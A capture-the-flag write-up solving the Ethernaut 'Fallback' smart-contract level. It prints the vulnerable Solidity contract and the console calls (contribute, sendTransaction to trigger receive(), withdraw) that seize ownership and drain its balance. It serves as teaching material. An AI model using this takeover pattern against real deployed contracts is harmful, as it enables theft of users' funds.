<img src="https://ethernaut.openzeppelin.com/imgs/BigLevel1.svg">

## Exploration

Given contract from Ethernaut.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
Challenge wants us to own the contract and withdraw all contribution from the contract. For this purpose, we should contribute this contract and call ```receive()``` function. In this way, we will own of the contract and withdraw all contribution.

## Subverting

Who is owner?

```js
await contract.owner()
"0x9CB391dbcD447E645D6Cb55dE6ca23164130D008"
```
The first thing to solve this challenge is contribute some wei.

```js
await contract.contribute({value: 4})
```
This notification met me.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/contribute.png">

```js
await contract.getContribution()
Object { negative: 0, words: (2) […], length: 1, red: null }
​
length: 1
​
negative: 0
​
red: null
​
words: Array [ 4, <1 empty slot> ]
​​
0: 4
​​
length: 2
​​
<prototype>: Array []
​
<prototype>: Object { _init: _init(t, e, r), _initNumber: _initNumber(t, e, r), _initArray: _initArray(t, e, r), … }
```
### JSON RPC ETH

One way to call receive function is send external value to contract with console.Part of understanding “what is JSON-RPC” is understanding RPC itself. The concept of a remote procedure call, or RPC, in distributed computing refers to the process by which a computer program causes the execution of a subroutine or a procedure in a different location, known as an address space. Such remote address spaces in distributed computing refer to other computers in a network.

RPCs are coded as though they were just local procedure calls. In other words, a programmer will code the same thing even if the subroutine was meant to be local or remote. There is no distinguishable difference in coding for both local and remote interactions, and the programmer does not need to explicitly indicate that such a procedure call is to be run locally or remotely.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/jsonrpc.png">

For the call receiving function, we use JSON RPC with the ``sendTransaction()`` method and enter the value that will make us the owner of the contract.

```js
await contract.sendTransaction({value: 1})
```
Check owner.

```js
await contract.owner()
"0x0C39eb3D6C0583AdA92e15C9e7610B609BBdF35b"

await contract.withdraw()

await contract.getContribution()
```
And submit instance.

<img src="https://github.com/wasny0ps/Ethernaut-Challenges/blob/main/Challenges/Fallback/img/submit.png">

**_by wasny0ps_**
